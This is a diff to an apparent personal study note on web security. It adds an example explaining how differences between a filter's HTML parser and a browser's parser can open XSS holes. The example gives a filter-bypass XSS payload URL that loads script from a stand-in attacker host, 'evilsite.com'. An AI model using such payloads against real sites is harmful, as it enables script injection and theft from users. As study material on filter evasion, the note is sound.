@@ -71,4 +71,7 @@ Parsing
 	HTML should be parsed according to the relevant spec, generally HTML5 now
 	Often not parsed by your browser but also Web-Application Firewalls and other filters.
 	Whenever there's a discrepancy in how these two items parse things, there's probably a vulnerability 
-	
+	Example:
+		You can go to https://example.com/vulnerable?name=<script/xss%20src=http://evilsite.com/my.js> and it generates
+		![[Pasted image 20240325211333.png]]
+		A bad XSS filter on the web application may not see that as a script tag due to it being a 'script/xss' tag. But Firefox's HTML parser, for instance 
